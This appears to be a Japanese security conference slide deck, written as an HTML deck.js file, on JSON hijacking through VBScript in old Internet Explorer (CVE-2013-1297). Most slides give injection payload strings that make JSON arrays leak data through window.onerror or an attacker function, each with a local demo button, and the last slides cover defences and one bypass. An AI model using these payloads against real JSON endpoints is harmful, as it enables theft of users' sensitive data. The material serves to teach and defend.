@@ -1,0 +1,502 @@
+﻿<!DOCTYPE html>
+<!--
+This presentation uses deck.js
+http://imakewebthings.com/deck.js/introduction/#how-to-overview
+-->
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=8">
+	<link rel="stylesheet" href="deck/core/deck.core.css">
+	<link rel="stylesheet" href="deck/extensions/goto/deck.goto.css">
+	<link rel="stylesheet" href="deck/extensions/navigation/deck.navigation.css">
+	<link rel="stylesheet" href="deck/extensions/status/deck.status.css">
+	<link rel="stylesheet" href="deck/extensions/hash/deck.hash.css">
+	<link rel="stylesheet" id="style-theme-link" href="deck/themes/style/web-2.0.css">
+	<title>JSON Hijacking using VBScript.</title>
+<style type="text/css">
+/* pre {font-family:monospace; color:#000; border : 1px solid #bbb;padding:1ex 1ex 1ex 1ex;}*/
+ pre {margin-top: 1ex;}
+ code {color:darkred !important;}
+ .r , code.r {color:red  !important;}
+ .p {color:#050;background-color:#cfc}
+ .i {color:brown}
+ .rem {color:#6f6}
+ .s {color:blue}
+ .str {color:blue;background-color:#ccf}
+ .res {color:brown}
+ .num {text-align:right}
+ a:link {text-decoration: none;}
+/* #errs {margin-top:1ex; margin-left:2em;}*/
+th , td { border : 1px solid #555 !important; padding: 2px 2px 2px 2px}
+</style>
+<script type="text/javascript">
+var testStr;
+function EvilFunc() {
+	var s = '';
+	for (var i = 0; i < arguments.length; i++) {
+		s += '\n  ' + i + ' : ';
+		if (typeof arguments[i] === 'string') {
+			s += '"' + arguments[i] + '"';
+		} else {
+			s += arguments[i];
+		}
+	}
+	var m = ((/sensitive/.test(e))||(/4748923/.test(e))) ? 'HIJACK SUCCEEDED!!' : 'Hijack failed.';
+	alert(m + '\n----------------------------------------\narguments:' + s);
+}
+</script>
+<script src="modernizr.custom.js"></script>
+
+<script type="text/vbscript">
+Sub doTest(id)
+    testStr = trim(document.getElementById("test" & id).innerText)
+    ExecuteGlobal testStr
+End Sub
+Dim a3d(0,0,0)
+</script>
+</head>
+
+<body class="deck-container">
+
+<section class="slide" id="title-slide">
+	<h2>VBScriptを使用したJSONハイジャック<br>CVE-2013-1297 及びその他の攻撃手法</h2>
+         <p>@masa141421356</p>
+         <p>このスライドは左右の矢印キーでページを移動してください</p>
+</section>
+
+<section class="slide" id="agenda">
+	<h2>概要</h2>
+	<ul>
+		<li>VBScript構文上のJSON配列</li>
+		<li>攻撃ベクタ</li>
+		<li>防御と回避</li>
+	</ul>
+</section>
+<section class=slide>
+	<h2>1. VBScript構文上のJSON配列</h2>
+	<h3>[]という特殊文法</h3>
+	<p>VBScript には、識別子を [] で括って参照することで、予約語と衝突する名前の識別子を参照できるという機能があります。</p>
+    <p>例：<code>[if]</code> は "if" という名前の識別子で if文の始まりの意味はありません</p>
+</section>
+<section class=slide>
+	<h3>[] 内のルール</h3>
+	<p>"[<i>character-sequence</i>]"　内の, <i>character-seqnence</i>は VBScriptの文字種の制限が適用されません</p>
+	<ol>
+		<li><code class="r">]</code> と改行以外の任意の文字が使用可能</li >
+		<li><code class="r">"</code> は単独の有効な文字</li>
+		<li><code class="r">'</code> も単独の有効な文字</li>
+	</ol>
+</section>
+<section class=slide>
+	<h3>つまり</h3>
+	<p>
+		JSON配列は文法的には Valid な VBScriptでもある。
+	</p>
+	<p>
+		実行させると実行時エラーになるかエラーにならずに実行できるかどちらか
+	</p>
+</section>
+<section class=slide>
+	<h2>2.攻撃ベクタ</h2>
+	<p>攻撃ベクタは2通り</p>
+	<ul>
+	    <li><code>window.onerror</code> の引数による情報漏洩(CVE-2013-1297)</li>
+	    <li>関数の引数を介した情報漏洩(Not bug)</li>
+	</ul>
+</section>
+<section class=slide>
+<h2>3.情報の漏洩するエラー</h2>
+<h3>3.1.任意の内容の漏洩するエラー</h3>
+<table rules=all border=1>
+	<tr><th>No.</th><th>メッセージ</th><th>英語</th></tr>
+	<tr>
+		<td> 13</td><td>型が一致しません。</td><td>Type missmatch</td>
+	</tr>
+	<tr>
+		<td>424</td><td>オブジェクトがありません。</td><td>Object Required</td>
+	</tr>
+	<tr>
+		<td>438</td><td>オブジェクトでサポートされていないプロパティまたはメソッドです。</td><td>Object doesn't support this property or method</td>
+	</tr>
+	<tr>
+		<td>450</td><td>引数の数が一致していません。または不正のプロパティを指定しています。</td><td>Wrong number of arguments or invalid property assignment</td>
+	</tr>
+	<tr>
+		<td>506</td><td>クラスが定義されていません。</td><td>Class not defined</td>
+	</tr>
+</table>
+</section>
+<section class=slide>
+<h2>3.情報の漏洩するエラー</h2>
+<h3>3.2.数値のみ漏洩するエラー</h3>
+<table rules=all border=1>
+	<tr><th>No.</th><th>メッセージ</th><th>英語</th></tr>
+	<tr>
+		<td>  6</td><td>オーバーフローしました。</td><td>Overflow</td>
+	</tr>
+	<tr>
+		<td>  9</td><td>インデックスが有効範囲にありません。</td><td>Subscript out of range</td>
+	</tr>
+</table>
+</section>
+<section class=slide>
+<h2>4.攻撃に必要なデータ注入数</h2>
+<h3>4.1.注入不要</h3>
+    <table rules=all border=1>
+		<tr><th>error code</th><th>error message</th></tr>
+		<tr>
+			<td>13</td><td>Type missmatch</td>
+		</tr>
+	</table>
+</section>
+<section class=slide>
+<h3>4.2.注入が１ヶ所必要</h3>
+	<table rules=all border=1>
+		<tr><th>error code</th><th>error message</th></tr>
+		<tr>
+			<td>424</td><td>Object Required</td>
+		</tr>
+		<tr>
+			<td>438</td><td>Object doesn't support this property or method</td>
+		</tr>
+		<tr>
+			<td>450</a></td><td>Wrong number of arguments or invalid property assignment</td>
+		</tr>
+		<tr>
+			<td>506</td><td>Class not defined</td>
+		</tr>
+	</table>
+</section>
+<section class=slide>
+<h3>4.3.注入が２ヶ所必要</h3>
+	<table rules=all border=1>
+		<tr><th>error code</th><th>error message</th></tr>
+		<tr>
+			<td>6</td><td>Overflow</td>
+		</tr>
+		<tr>
+			<td>9</td><td>Subscript out of range</td>
+		</tr>
+	</table>
+</section>
+<section class=slide>
+<h2>5.秘密情報の取得</h2>
+<p>VBScriptの <code>Err.Description</code>には文脈依存の内容は含まれませんが、<code>window.onerror</code> の引数には文脈依存の内容も入っていて、そこから秘密情報を抜き取ることが可能です。</p>
+<pre>
+<span class="s">&lt;</span><span class="i">script</span><span class="s">&gt;</span>
+    window.onerror = function(e){ alert(e);};
+<span class="s">&lt;/</span><span class="i">script</span><span class="s">&gt;</span>
+<span class="s">&lt;</span><span class="i">script</span> <span class="r">language</span><span class="s">="vbs"</span> <span class="r">src</span><span class="s">="http://example.com/json"&gt;</span>
+</pre>
+</section>
+<section class=slide>
+<h3>5.1.データ注入無しの情報漏えい</h2>
+JSON配列全体が VBScriptで識別子と認識可能な場合、<code>Call</code>の省略された Call文扱いとなり、実行時エラー13が発生します。
+<pre id="test1">
+    ["sensitive","data","is","here"]
+</pre>
+<p><input type="button" value="コード実行" onclick="doTest(1)"></p>
+
+<p>この手法だけで十分では？ と思うかもしれませんが、これ以外の方法でしかできない攻撃もあるんです。</p>
+</section>
+<section class=slide>
+<h3>5.2. 識別子の文字数制限</h3>
+
+<ul>
+<li>実は[]には１つ限界があります。</li>
+<li>[]で識別子として認識出来るのは255文字まで</li>
+<li>それを超えたら構文エラーで実行不能</li>
+<li>ではどうすれば？</li>
+</ul>
+</section>
+<section class=slide>
+<h2>6.JSON配列を分割する</h2>
+<p>JSON配列に攻撃者が文字列を注入できる場所があり、<code class=r>]</code>をエスケープしていない場合、
+そこでJSON配列を分割することで攻撃が可能になります。
+</section>
+<section class=slide>
+<h3>6.1.文字列注入が１ヶ所の場合</h3>
+ここでは以下の形を考えます。
+<pre>["sensitive-data-1","<span class="r">$USER-INPUT</span>","sensitive-data-2"]</pre>
+</section>
+<section class=slide>
+<h3>6.2.sensitive-data-1を得る手法</h3>
+まず、攻撃者の注入データより前にあるデータを得る方法から。
+</section>
+<section class=slide>
+<h3>6.2.1.エラー424(Object requiered)</h3>
+    <p>存在しないオブジェクトのプロパティを参照</p>
+<pre id="test211">["sensitive-data-1","<span class="r">].aa '</span>","sensitive-data-2"]</pre>
+    これは以下のように解釈されます。
+<pre><span class="p">["sensitive-data-1","]</span>.aa <span class="rem">'","sensitive-data-2"]</span></pre>
+    <p><input type="button" value="コード実行" onclick="doTest(211)"></p>
+</section>
+<section class=slide>
+<h3>6.2.2.エラー438<br><small>(Object doesn't support this property or method)</small></h3>
+  <code>Set</code>を使わずにオブジェクトを代入する
+<pre id="test212">["sensitive-data-1","<span class="r">]=CreateObject("Microsoft.xmlhttp")'</span>","sensitive-data-2"]</pre>
+    これは以下のように解釈されます。
+<pre><span class="p">["sensitive-data 1","]</span>=<span class="res">CreateObject</span>(<span class="str">"Microsoft.xmlhttp"</span>)<span class="rem">'","sensitive-data-2"]</span></pre>
+  <p><input type="button" value="コード実行" onclick="doTest(212)"></p>
+</section>
+<section class=slide>
+<h3>6.2.3.エラー13その2</h3>
+    <code>Call</code>の無い Call文を使う<input type="button" value="コード実行" onclick="doTest(213)">
+<pre id="test213">["sensitive-data-1","<span class="r">]'</span>","sensitive-data-2"]</pre>
+    これは以下のように解釈されます。
+<pre><span class="p">["sensitive-data-1","]</span><span class="rem">'","sensitive-data-2"]</span></pre>
+</section>
+<section class=slide>
+<h3>6.2.4.エラー13その3</h3>
+    未定義変数に配列としてアクセスして実行時エラー13
+<pre id="test214">["sensitive-data-1","<span class="r">](0)=0'</span>","sensitive-data-2"]</pre>
+    これは以下のように解釈されます。
+<pre><span class="p">["sensitive-data-1","]</span>(0)=0<span class="rem">'","sensitive-data-2"]</span></pre>
+    <p><input type="button" value="コード実行" onclick="doTest(214)"></p>
+</section>
+<section class=slide>
+<h3>6.2.5.エラー450<br>
+<small>(Wrong number of arguments or invalid property assignment)</small>
+</h3>
+関数への参照を未定義の変数へ代入<br>
+(funcNameに攻撃者の定義したグローバル関数の名前が入っている状態)
+<pre id="test215">["sensitive-data-1","<span class="r">]=GetRef(funcName)'</span>","sensitive-data-2"]</pre>
+    これは以下のように解釈されます。
+<pre><span class="p">["sensitive-data 1","]</span>=<span class="res">GetRef</span>(funcName)<span class="rem">'","sensitive-data-2"]</span></pre>
+    <p><input type="button" value="コード実行" onclick="funcName='doTest';doTest(215)"></p>
+</section>
+<section class=slide>
+<h3>6.3.sensitive-data-2</h3>
+後半部分を読み取る方法
+</section>
+<section class=slide>
+<h3>6.3.1.エラー13その4</h3>
+    前半をエラーの無い代入にして後半でエラー
+<pre id="test221a">["sensitive-data-1","<span class="r">]=0:[</span>","sensitive-data-2"]</pre>
+    これは以下のように解釈されます。
+<pre><span class="p">["sensitive-data-1","]</span>=0:<span class="p">[","sensitive-data-2"]</span></pre>
+    <p><input type="button" value="コード実行" onclick="doTest('221a')"></p>
+</section>
+<section class=slide>
+<h3>6.3.2.エラー438<br>
+<small>Object doesn't support this property or method)</small></h3>
+    既存オブジェクトの存在しないメンバーへの参照
+<pre id="test222">["sensitive-data-1","<span class="r">]=document.[</span>","sensitive-data-2"]</pre>
+    これは以下のように解釈されます。
+<pre><span class="p">["sensitive-data-1","]</span>=<span class="i">document</span>.<span class="p">[","sensitive-data-2"]</span></pre>
+<p><input type="button" value="コード実行" onclick="doTest(222)"></p>
+</section>
+<section class=slide>
+<h3>6.3.3.エラー506(Class not defined)</h3>
+    クラスではないものをnew
+<pre id="test223">["sensitive-data-1","<span class="r">]=new [</span>","sensitive-data-2"]</pre>
+    This will be executed as:
+<pre><span class="p">["sensitive-data 1","]</span>=<span class="res">new</span> <span class="p">[","sensitive-data-2"]</span></pre>
+    <p><input type="button" value="コード実行" onclick="doTest(223)"></p>
+</section>
+<section class=slide>
+<h3>6.4.文字列注入２箇所</h3>
+ここでは以下の形を考えます。<br>
+ここでは、JSONを生成するモジュールは <code class="r">"</code> を <code class="r">\"</code> にエスケープするものとします。
+<pre>["<span class="r">$USER-INPUT1</span>","sensitive-data","<span class="r">$USER-INPUT2</span>"]</pre>
+</section>
+<section class=slide>
+<h3>6.4.1.エラー424再び(Object required)</h3>
+    オブジェクトではないもので<code>With</code>文
+<pre id="test31">["<span class="r">]=0:With [</span>","sensitive-data","<span class="r">]:End With'</span>"]</pre>
+    これは以下のように解釈されます。
+<pre><span class="p">["]</span>=0:<span class="res">With</span> <span class="p">[","sensitive-data","]</span>:<span class="res">End With</span><span class="rem">'"]</span></pre>
+    <p><input type="button" value="コード実行" onclick="doTest(31)"></p>
+</section>
+<section class=slide>
+<h3>6.4.2.エラー438再び</h3>
+    既存オブジェクトの存在しないメンバーへ代入
+<pre id="test32">["<span class="r">]=0:document.[</span>","sensitive-data","<span class="r">]=1'</span>"]</pre>
+    これは以下のように解釈されます。
+<pre><span class="p">["]</span>=0:document.<span class="p">[","sensitive-data","]</span>=1<span class="rem">'"]</span></pre>
+    <p><input type="button" value="コード実行" onclick="doTest(32)"></p>
+</section>
+<section class=slide>
+<h3>6.4.3.しつこいけどエラー13</h3>
+<p>文字列を数値に変換しようとしてエラー。</p>
+<p>引数が３つ以上あり、数値であることが要求される引数のところに秘密情報を渡す。以下の関数が攻撃に使用可能。</p>
+<ol>
+ <li><code>DateAdd(第2引数)</code></li>
+ <li><code>Mid(第2引数)</code></li>
+ <li><code>MsgBox(第2引数)</code></li>
+ <li><code>RGB(第2引数)</code></li>
+</ol>
+</section>
+<section class=slide>
+<h3>攻撃例</h3>
+<code>Mid</code> 関数を使った例
+<pre id="test33">["<span class="r">]=0:Mid 0\"1</span>","sensitive-data","<span class="r">1\"'</span>"]</pre>
+    これは以下のように解釈されます。
+<pre><span class="p">["]</span>=0:Mid 0\<span class="str">"1"</span>,<span class="str">"sensitive-data"</span>,<span class="str">"1\"</span><span class="rem">'"]</span></pre>
+    <p><input type="button" value="コード実行" onclick="doTest(33)"></p>
+</section>
+<section class=slide>
+<h3>6.4.4.エラー 9 (Subscript out of range)</h3>
+配列のインデクス範囲外のエラー（数値のみ漏洩。Integerの範囲外の場合はエラー6）<br>
+ここでは <code>a3d(0,0,0)</code>として配列宣言済みで、秘密情報は<code>"4748923"</code>であるものとします。
+<pre id="test34">["<span class="r">]=0:a3d(0\"1</span>","4748923","<span class="r">0\")=0'</span>"]</pre>
+    これは以下のように解釈されます。
+<pre><span class="p">["]</span>=0:a3d(0\<span class="str">"1"</span>, <span class="str">"4748923"</span>,<span class="str">"0\"</span>)=0<span class="rem">'"]</span></pre>
+    <p><input type="button" value="コード実行" onclick="doTest(34)"></p>
+</section>
+<section class=slide>
+<h3>6.4.5.エラー 6 (Overflow)</h3>
+配列のインデクスに<code>Integer</code>の範囲外値を指定。<br>
+ここでは a3d(0,0,0)として宣言済みで、秘密情報は<code>"47489234748923"</code>であるものとします。
+<pre id="test35">["<span class="r">]=0:a3d(0\"1</span>","47489234748923","<span class="r">0\")=0'</span>"]</pre>
+    これは以下のように解釈されます。
+<pre><span class="p">["]</span>=0:a3d(0\<span class="str">"1"</span>,<span class="str">"47489234748923"</span>,<span class="str">"0\"</span>)=0<span class="rem">'"]</span></pre>
+    <p><input type="button" value="コード実行" onclick="doTest(35)"></p>
+</section>
+<section class=slide>
+<h3>6.4.5.エラー 6 その2</h3>
+一定の範囲内の数値を引数に要求する関数等に範囲外の数値を渡す。既知の攻撃ベクタ
+<ol>
+  <li><code>Redim (配列の添字範囲はLong)</code></li>
+  <li><code>RGB(引数はInteger)</code></li>
+  <li><code>Mid(第2引数はLong)</code>
+  <li><code>MsgBox(第2引数はLong)</code></li>
+</ol>
+</section>
+<section class=slide>
+<h3>攻撃例</h3>
+  秘密情報は"4748923"とします。エラーが無い場合はevilValの値から内容を推測可能。
+<pre id="test36">["<span class="r">]=0:evilVal=RGB(0\"1</span>","4748923","<span class="r">0\")'</span>"]</pre>
+    これは以下のように解釈されます。
+<pre><span class="p">["]</span>=0:evilVal=RGB(0\<span class="str">"1"</span>,<span class="str">"4748923"</span>,<span class="str">"0\"</span>)<span class="rem">'"]</span></pre>
+    <p><input type="button" value="コード実行" onclick="doTest(36)"></p>
+</section>
+<section class=slide>
+<h2>7.エラーを使わない攻撃</h2>
+以下のような形の場合を考えます。
+<pre>["<span class="r">$USER-INPUT1</span>","sensitive-data","<span class="r">$USER-INPUT2</span>"]</pre>
+</section>
+<section class=slide>
+<h3>7.1.正常に実行する攻撃</h3>
+攻撃者の用意した関数<code>EvilFunc</code>に秘密情報を渡す。
+<pre id="test41">["<span class="r">]=0:EvilFunc 0\"1</span>","sensitive-data","<span class="r">\"'</span>"]</pre>
+    これは以下のように解釈されます。
+<pre><span class="p">["]</span>=0:EvilFunc 0\<span class="str">"1"</span>,<span class="str">"sensitive-data"</span>,<span class="str">"\"</span><span class="rem">'"]</span></pre>
+</section>
+<section class=slide>
+これは以下の関数で秘密情報を奪取可能。
+<pre><span class="res">function</span> EvilFunc() {
+    <span class="res">var</span> s = <span class="s">''</span>;
+    <span class="res">for</span> (<span class="res">var</span> i = 0; i &lt; arguments.length; i++) {
+        s += <span class="s">'\n  '</span> + i + <span class="s">' : '</span>;
+        <span class="res">if</span> (<span class="res">typeof</span> arguments[i] === <span class="s">'string'</span>) {
+            s += <span class="s">'"'</span> + arguments[i] + <span class="s">'"'</span>;
+        } <span class="res">else</span> {
+          s += arguments[i];
+        }
+    }
+    <span class="res">var</span> m = (<span class="r">/sensitive/</span>.test(s)) ? <span class="s">'HIJACK SUCCEEDED!!'</span> : <span class="s">'Hijack failed.'</span>;
+    alert(m + <span class="s">'\n----------------------------------------\narguments:'</span> + s);
+}</pre>
+<p><input type="button" value="コード実行" onclick="doTest(41)"></p>
+</section>
+<section class=slide>
+<h3>7.2.Err.Reise</h3>
+Err.Raiseで強制的に実行時エラーを起こすことも可能
+<pre id="test42">["<span class="r">]=0:Err.Raise 1,0\"1</span>","sensitive-data","<span class="r">\"'</span>"]</pre>
+    これは以下のように解釈されます。
+<pre><span class="p">["]</span>=0:Err.Raise 1,0\<span class="str">"1"</span>,<span class="str">"sensitive-data"</span>,<span class="str">"\"</span><span class="rem">'"]</span></pre>
+<p><input type="button" value="コード実行" onclick="doTest(42)"></p>
+</section>
+<section class=slide>
+<h2>8.JSONを守るには</h2>
+<p>JSON保護にはいくつかの方法がありますが、私は<b>VBScriptとして実行させない</b>という対策を強く勧めます
+<ol>
+    <li>VBScriptとしての実行を出来なくする</li>
+    <li>VBScript文法エラーのJSON(1:valid JSON)</li>
+    <li>VBScript文法エラーのJSON(2:Invalid JSONの構文の枠外)</li>
+</ul>
+</section>
+<section class=slide>
+<h3>8.1.VBScriptとして実行させない</h3>
+<p>はせがわさんの日記読んでください。</p>
+<br>
+<p>以下、そのような対策が出来ない場合の話です。</p>
+</section>
+<section class=slide>
+<h3>8.2.VBScript構文エラー1</h3>
+<h3>8.2.1.先頭の<code class=r>[</code>の後で改行</h3>
+  最もシンプルな対策です。しかし、以下の理由からお勧めしません。
+<ul>
+  <li>一部のテンプレートエンジンは出力データサイズを削るために改行を勝手に除去する</li>
+  <li>それがセキュリティ上必要であることがわかりづらいため、プログラマが勝手に削る可能性がある</lli>
+</ul>
+  この方法では構文エラー 1007 (Expected ']') が発生します。
+<pre id="test52"><span class="r">[</span>
+"sensitive","data","is","here"]</pre>
+<p><input type="button" value="コード実行" onclick="doTest(52)"></p>
+</section>
+<section class=slide>
+<h3>8.2.2.JSONオブジェクトの形にする</h3>
+ JSONのオブジェクトは <code>"{"</code> で構文エラー 1032 (Invalid character).になるので安全です。
+<pre id="test53"><span class="r">{</span>"data": ["sensitive","data","is","here"]}</pre>
+<p><input type="button" value="コード実行" onclick="doTest(53)"></p>
+</section>
+<section class=slide>
+<h3>8.3.VBScript構文エラー2</h3>
+<h3>8.3.1.先頭に<code>for(;;);</code></h3>
+VBScriptのfor文はforの後に識別子が必要なので構文エラー 1010(Expected identifier)
+<pre id="test61">for<span class="r">(;;)</span>;["sensitive","data","is","here"]<
+<p><input type="button" value="コード実行" onclick="doTest(61)"></p>
+</section>
+<section class=slide>
+<h3>8.3.2.先頭に<code>while(1);</code></h3>
+whileの後の<code>";"</code> で構文エラー 1024(Expected statement)
+<pre id="test62a">while(1)<span class="r">;</span>["sensitive","data","is","here"]</pre>
+<p><input type="button" value="コード実行" onclick="doTest('62a')"></p>
+</section>
+<section class=slide>
+<h3>重要</h3>
+<p>あくまでもエラーを起こすのは <code class="r">;</code> であって <code class="r">while(1)</code>ではありません。</p>
+<p><code class="r">;</code> のない形だと <code class="r">]:Wend'</code> を補うことで突破可能です
+<pre id="test62b">while(1)
+["sensitive-data 1","<span class="r">]:Wend'</span>","sensitive-data-2"]</pre>
+    これは以下のように解釈されます。
+<pre><span class="res">while</span>(1)
+<span class="p">["sensitive-data 1","]</span>:<span class="res">Wend</span><span class="rem">'","sensitive-data-2"]</span>
+<p><input type="button" value="コード実行" onclick="doTest('62b')"></p>
+</section>
+<script type="text/javascript" src="jquery-1.7.min.js" charset="UTF-8"></script>
+<script type="text/javascript" src="deck/core/deck.core.js" charset="UTF-8"></script>
+<script type="text/javascript" src="deck/extensions/goto/deck.goto.js" charset="UTF-8"></script>
+<script type="text/javascript" src="deck/extensions/navigation/deck.navigation.js" charset="UTF-8"></script>
+<script type="text/javascript" src="deck/extensions/status/deck.status.js" charset="UTF-8"></script>
+<script type="text/javascript" src="deck/extensions/hash/deck.hash.js" charset="UTF-8"></script>
+<!-- Required Modernizr file -->
+<script type="text/javascript">
+$(function() {
+	$.deck('.slide');
+});
+
+window.onerror = function(e){
+	var s = "\n----------------------------------------------------------------------\n"
+	var m = ((/sensitive/.test(e))||(/4748923/.test(e))) ? "HIJACK SUCCEEDED!!" : "Hijack failed.";
+	var a="";
+	for (var i = 0; i < arguments.length; i++) {
+		a += '  ' + i + ' : ';
+		if (i == 1) {
+			a += ('"http://example.com/json?code=' + encodeURIComponent(testStr))+'"\n';
+		} else if (typeof arguments[i] === 'string') {
+			a += '"' + arguments[i] + '"\n';
+		} else {
+			a += arguments[i]+"\n";
+		}
+	}
+	alert(m + s + a + s + testStr + "\n");
+	return false;
+};
+</script>
+</body>
+</html>
